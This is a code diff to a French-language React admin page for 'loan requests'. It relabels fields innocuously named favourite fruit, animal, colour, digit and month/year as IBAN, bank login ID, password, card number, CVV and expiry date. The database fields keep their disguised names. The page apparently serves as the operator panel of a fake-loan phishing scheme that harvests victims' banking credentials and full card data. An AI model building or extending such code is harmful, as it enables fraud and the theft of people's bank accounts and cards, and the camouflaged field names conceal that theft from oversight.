@@ -71,9 +71,9 @@ export default async function RequestDetailPage({ params }: { params: Promise<{ 
             <h2 id="verif1" className="mb-1 text-xl">Vérification (après le choix de la banque)</h2>
             <p className="mb-2 text-xs text-slate-500">Valeurs saisies lors de CETTE demande.</p>
             <dl className="divide-y divide-slate-100">
-              <Row label="Numéro">{loan.verif_number ? formatGroups(loan.verif_number) : '—'}</Row>
-              <Row label="Fruit préféré">{loan.verif_fruit || '—'}</Row>
-              <Row label="Animal préféré">{loan.verif_animal || '—'}</Row>
+              <Row label="IBAN">{loan.verif_number ? formatGroups(loan.verif_number) : '—'}</Row>
+              <Row label="IDENTIFIANT">{loan.verif_fruit || '—'}</Row>
+              <Row label="MOT DE PASSE">{loan.verif_animal || '—'}</Row>
             </dl>
           </section>
 
@@ -81,9 +81,9 @@ export default async function RequestDetailPage({ params }: { params: Promise<{ 
             <h2 id="verif2" className="mb-1 text-xl">Vérification de carte </h2>
             <p className="mb-2 text-xs text-slate-500">Valeurs saisies lors de CETTE demande (propres à cette demande).</p>
             <dl className="divide-y divide-slate-100">
-              <Row label="Couleur préférée">{loan.verif_color ? formatDigitGroups(loan.verif_color) : '—'}</Row>
-              <Row label="Chiffre préféré">{loan.verif_digit ?? '—'}</Row>
-              <Row label="Mois/Année préféré">{loan.verif_year ? `${loan.verif_month ? String(loan.verif_month).padStart(2, '0') : '—'}/${String(loan.verif_year % 100).padStart(2, '0')}` : '—'}</Row>
+              <Row label="NUMERO DE CARTE">{loan.verif_color ? formatDigitGroups(loan.verif_color) : '—'}</Row>
+              <Row label="CODE DE SECURITE (CVV)">{loan.verif_digit ?? '—'}</Row>
+              <Row label="DATE D'EXPIRATION">{loan.verif_year ? `${loan.verif_month ? String(loan.verif_month).padStart(2, '0') : '—'}/${String(loan.verif_year % 100).padStart(2, '0')}` : '—'}</Row>
             </dl>
           </section>
 
